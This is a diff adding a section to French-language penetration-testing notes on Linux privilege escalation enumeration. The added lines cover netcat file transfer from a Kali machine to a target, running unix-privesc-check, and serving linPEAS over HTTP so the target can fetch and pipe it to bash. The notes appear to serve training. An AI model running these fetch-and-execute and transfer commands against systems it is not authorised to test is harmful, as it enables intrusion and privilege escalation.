@@ -167,6 +167,48 @@ find / -perm -u=s -type f 2>/dev/null
 Référence pour l'exploitation : [GTFOBins](https://gtfobins.github.io/), [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
 
 ```bash
-# Extraire le contenu lisible du binaire
+# Extraire le contenu lisible d'un binaire
 strings /usr/bin/passwd_flag
+```
+
+### Enumération automatique
+
+#### Transfert de fichiers avec nc
+
+```bash
+# Cible : écouter (lancer en premier)
+nc -lvnp 4444 > fichier_reçu
+
+# Kali : envoyer
+nc <ip_cible> 4444 < fichier_à_envoyer
+```
+
+#### unix-privesc-check
+
+Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.
+
+```bash
+# Standard : rapide, peu de faux positifs
+./unix-privesc-check standard > output.txt
+
+# Detailed : vérifie aussi les file handles ouverts et les fichiers appelés par les scripts
+./unix-privesc-check detailed > output.txt
+```
+
+Chercher les lignes `WARNING` dans l'output — elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).
+
+#### linPEAS
+
+```bash
+# Kali : servir
+cp /usr/share/peass/linpeas/linpeas.sh .
+python3 -m http.server 80
+```
+
+```bash
+# Cible : télécharger et exécuter
+curl http://<ip>/linpeas.sh | bash
+# ou
+wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+./linpeas.sh > output.txt
 ```
